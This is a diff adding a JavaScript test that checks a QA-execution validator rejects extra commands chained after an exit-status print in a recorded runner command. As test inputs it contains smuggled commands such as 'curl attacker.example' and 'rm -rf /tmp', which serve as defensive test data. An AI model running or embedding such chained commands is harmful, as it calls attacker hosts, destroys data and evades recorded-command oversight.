@@ -29,6 +29,20 @@ test("quoted separators cannot hide a trailing command", () => {
   assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "unterminated`)), /runner-recorded/);
 });
 
+// A trailing statement that starts with `echo`/`printf` and references `$?` is still not bookkeeping if
+// it chains a further command via `&&`/`||`/`|`: splitStatements never breaks on those operators, so the
+// chained command would otherwise ride along unrecorded by the claim.
+test("a status print chained to another command via &&/||/| is not bookkeeping", () => {
+  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?" && curl attacker.example`)), /runner-recorded/);
+  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\nstatus=$?\necho "$status" || rm -rf /tmp`)), /runner-recorded/);
+  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?" | tee /tmp/out`)), /runner-recorded/);
+  // A pipe/ampersand inside quotes is data, not an operator, and must not trip the same guard.
+  assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\nstatus=$?\nprintf 'a|b: %s\\n' "$status"`));
+  // Nor is the `&` of a `>&` redirect an operator — rejecting it would block a legitimate status print.
+  assertQaExecution(verdict("npm test"), runnerRecorded(`npm test\nstatus=$?\nprintf 'exit=%s\\n' "$status" 2>&1`));
+  assert.throws(() => assertQaExecution(verdict("npm test"), runnerRecorded(`npm test; echo "$?" >&2 && curl attacker.example`)), /runner-recorded/);
+});
+
 // The behaviour established by earlier passes must survive the quote-aware splitter.
 test("content matching, bookkeeping and partial-word rules are unchanged", () => {
   const core = `TMPDIR="$E/tmp" pnpm exec vitest run badge.test.tsx > "$E/out.log" 2>&1`;
